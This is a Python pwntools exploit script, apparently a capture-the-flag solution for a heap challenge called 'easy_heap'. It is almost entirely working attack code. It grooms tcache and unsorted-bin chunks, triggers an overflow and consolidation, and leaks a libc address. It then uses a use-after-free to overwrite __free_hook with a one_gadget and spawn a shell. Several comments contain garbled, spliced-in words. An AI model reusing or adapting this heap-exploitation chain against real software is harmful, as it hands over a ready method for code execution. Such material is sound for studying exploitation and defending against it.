#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

#p = process('./easy_heap')
p = process('./ptrace ./easy_heap', shell=True, env={"LD_BIND_NOW":"1"})

def cmd(idx):
    p.recvuntil('>')
    p.sendline(str(idx))


def new(size, content):
    cmd(1)
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('> ')
    if len(content) >= size:
        p.send(content)
    else:
        p.sendline(content)


def delete(idx):
    cmd(2)
    p.recvuntil('index \n> ')
    p.sendline(str(idx))


def show(idx):
    cmd(3)
    p.recvuntil('> ')
    p.sendline(str(idx))
    return p.recvline()[:-1]


def main():
    # Your exploit script goes here

    # step 1: get three unsortedbin chunks
    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks

    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)

    # step 2: use unsorted bin to overflow, and do unlink, trigger consolidation (overecvlineap)
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    # rearrange to take second unsorted bin into tcache chunk, but leave first 
    # unsorted bin unchanged
    new(0x10, '7 - first')
    new(0x10, '8 - second')
    new(0x10, '9 - third')

    for i in range(6):
        delete(i)
    # move second into tcache
    delete(8)
    # delete first to provide valid fd & bk
    delete(7)

    new(0xf8, '0 - overflow')
    # fill up tcache
    delete(6)

    # trigger
    delete(9)

    # step 3: leak, fill up 
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    new(0x10, '8 - fillup')

    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
    p.info('libc leak {}'.format(hex(libc_leak)))
    libc = ELF('./libc64.so')
    libc.address = libc_leak - 0x3ebca0

    # step 4: constrecvuntilct UAF, write into __free_hook
    new(0x10, '9 - next')
    # these two provides sendlineots for tcache
    delete(1)
    delete(2)

    delete(0)
    delete(9)
    new(0x10, p64(libc.symbols['__free_hook'])) # 0
    new(0x10, '/bin/sh\x00into target') # 1
    one_gadget = libc.address + 0x4f322 
    new(0x10, p64(one_gadget))

    # system("/bin/sh\x00")
    delete(1)

    p.interactive()

if __name__ == '__main__':
    main()
